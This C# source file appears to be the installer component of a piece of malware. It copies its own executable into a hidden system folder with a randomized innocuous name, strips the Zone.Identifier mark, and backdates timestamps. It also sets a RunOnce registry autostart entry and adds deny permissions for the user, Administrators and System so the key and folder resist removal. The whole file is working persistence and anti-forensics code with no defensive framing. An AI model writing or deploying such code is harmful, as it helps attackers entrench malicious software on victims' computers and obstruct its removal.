using System;
using System.IO;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Runtime.InteropServices;
using System.Reflection;
using Microsoft.Win32;
using System.Diagnostics;

namespace A
{
    public class Installer
    {
        private static string[] FileNames = { "Solution", "Project", "Wireless", "Certificate", "Host",
                                              "Driver", "Process", "Build", "Windows", "Interface",
                                              "Diagnostic", "Release", "Debug", "Platform" };

        private static string CurrentUser = WindowsIdentity.GetCurrent().Name;
        private static Random Rand = new Random(Guid.NewGuid().GetHashCode());

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        private static extern bool DeleteFile(string lpFileName);

        public static void InstallFile()
        {
            string InstallRoot = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

            // Remove Duplicates
            foreach (string _previousInstall in Directory.GetDirectories(InstallRoot))
            {
                if (_previousInstall.Contains("Config_Cache_"))
                    DeleteDirectory(_previousInstall);
            }

            // Directory
            string InstallDirectoryName = string.Format("{0} {1} Config_Cache_", FileNames[Rand.Next(0, FileNames.Length)], FileNames[Rand.Next(0, FileNames.Length)]);
            string InstallDirectoryPath = string.Concat(InstallRoot, "\\", InstallDirectoryName);

            // File
            string InstallFileName = string.Format("{0}_{1}.exe", FileNames[Rand.Next(0, FileNames.Length)], FileNames[Rand.Next(0, FileNames.Length)]);
            string InstallFilePath = string.Concat(InstallDirectoryPath, "\\", InstallFileName);

            // Init
            CreateDirectory(InstallDirectoryPath);
            CopyFileToDirectory(InstallDirectoryPath, InstallFilePath);
            CreateRegistryEntry(InstallFilePath);
        }

        private static void CreateRegistryEntry(string InstallFilePath)
        {
            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);

            regKey.SetValue("Driver Interface", string.Format("\"{0}\"", InstallFilePath));
            regKey.Close();

            ProtectStartupKey();
        }

        private static void ProtectStartupKey()
        {
            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);

            RegistrySecurity regSec = regKey.GetAccessControl();

            RegistryAccessRule regAccessUser = new RegistryAccessRule(CurrentUser,
                                                        RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
                                                        RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
                                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                        PropagationFlags.None,
                                                        AccessControlType.Deny);

            RegistryAccessRule regAccessAdmin = new RegistryAccessRule("Administrators",
                                                       RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
                                                       RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
                                                       InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                       PropagationFlags.None,
                                                       AccessControlType.Deny);

            RegistryAccessRule regAccessSystem = new RegistryAccessRule("System",
                                                     RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
                                                     RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
                                                     InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                     PropagationFlags.None,
                                                     AccessControlType.Deny);

            regSec.AddAccessRule(regAccessUser);
            regSec.AddAccessRule(regAccessAdmin);
            regSec.AddAccessRule(regAccessSystem);

            regKey.SetAccessControl(regSec);
        }

        private static void UnProtectStartupKey()
        {
            RegistryKey regKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\RunOnce", true);

            RegistrySecurity regSec = regKey.GetAccessControl();

            RegistryAccessRule regAccessUser = new RegistryAccessRule(CurrentUser,
                                                        RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
                                                        RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
                                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                        PropagationFlags.None,
                                                        AccessControlType.Deny);

            RegistryAccessRule regAccessAdmin = new RegistryAccessRule("Administrators",
                                                       RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
                                                       RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
                                                       InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                       PropagationFlags.None,
                                                       AccessControlType.Deny);

            RegistryAccessRule regAccessSystem = new RegistryAccessRule("System",
                                                     RegistryRights.ChangePermissions | RegistryRights.CreateSubKey | RegistryRights.Delete |
                                                     RegistryRights.SetValue | RegistryRights.TakeOwnership | RegistryRights.WriteKey,
                                                     InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                                     PropagationFlags.None,
                                                     AccessControlType.Deny);

            regSec.RemoveAccessRule(regAccessUser);
            regSec.RemoveAccessRule(regAccessAdmin);
            regSec.RemoveAccessRule(regAccessSystem);

            regKey.SetAccessControl(regSec);
        }

        private static void CopyFileToDirectory(string DirectoryPath, string InstallPath)
        {
            UnProtectDirectory(DirectoryPath);

            File.Copy(Assembly.GetEntryAssembly().Location, InstallPath);

            DeleteFile(string.Concat(InstallPath, ":Zone.Identifier"));

            FileInfo fInfo = new FileInfo(InstallPath);

            fInfo.Attributes = FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed;

            DateTime spoofDate = new DateTime(Rand.Next(2007, 2013), Rand.Next(1, 12), Rand.Next(1, 25), Rand.Next(0, 23), Rand.Next(0, 59), Rand.Next(0, 59));
            fInfo.CreationTime = spoofDate;
            fInfo.LastAccessTime = spoofDate;
            fInfo.LastWriteTime = spoofDate;

            ProtectDirectory(DirectoryPath);
        }

        private static void CreateDirectory(string DirectoryPath)
        {
            if (Directory.Exists(DirectoryPath))
                DeleteDirectory(DirectoryPath);

            DirectoryInfo dirInfo = Directory.CreateDirectory(DirectoryPath);

            dirInfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed;

            DateTime spoofDate = new DateTime(Rand.Next(2007, 2013), Rand.Next(1, 12), Rand.Next(1, 25), Rand.Next(0, 23), Rand.Next(0, 59), Rand.Next(0, 59));
            dirInfo.CreationTime = spoofDate;
            dirInfo.LastAccessTime = spoofDate;
            dirInfo.LastWriteTime = spoofDate;

            ProtectDirectory(DirectoryPath);
        }

        private enum DeletionStatus : int
        {
            UnknownError = -1,
            DoesNotExist = 0,
            Success = 1,
            ActiveProcess
        }

        private static DeletionStatus DeleteDirectory(string DirectoryPath)
        {
            if (!Directory.Exists(DirectoryPath))
                return DeletionStatus.DoesNotExist;

            UnProtectDirectory(DirectoryPath);

            foreach (string _childExe in Directory.GetFiles(DirectoryPath))
            {
                foreach (Process _childProcess in Process.GetProcessesByName(Path.GetFileNameWithoutExtension(_childExe)))
                {
                    try
                    {
                        _childProcess.Kill();
                    }
                    catch (Exception)
                    {
                        return DeletionStatus.ActiveProcess;
                    }
                }
            }

            Directory.Delete(DirectoryPath, true);

            if (!Directory.Exists(DirectoryPath))
                return DeletionStatus.Success;
            else
                return DeletionStatus.UnknownError;
        }

        private static void ProtectDirectory(string DirectoryPath)
        {
            DirectoryInfo dirInfo = new DirectoryInfo(DirectoryPath);

            DirectorySecurity dirSec = dirInfo.GetAccessControl();

            dirSec.AddAccessRule(new FileSystemAccessRule(CurrentUser,
                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            dirSec.AddAccessRule(new FileSystemAccessRule("Administrators",
                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            dirSec.AddAccessRule(new FileSystemAccessRule("System",
                                       FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            Directory.SetAccessControl(DirectoryPath, dirSec);
        }

        private static void UnProtectDirectory(string DirectoryPath)
        {
            DirectoryInfo dirInfo = new DirectoryInfo(DirectoryPath);

            DirectorySecurity dirSec = dirInfo.GetAccessControl();

            dirSec.RemoveAccessRule(new FileSystemAccessRule(CurrentUser,
                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            dirSec.RemoveAccessRule(new FileSystemAccessRule("Administrators",
                                        FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            dirSec.RemoveAccessRule(new FileSystemAccessRule("System",
                                       FileSystemRights.Delete | FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Write | FileSystemRights.Read,
                                        InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit,
                                        PropagationFlags.None,
                                        AccessControlType.Deny));

            Directory.SetAccessControl(DirectoryPath, dirSec);
        }
    }
}
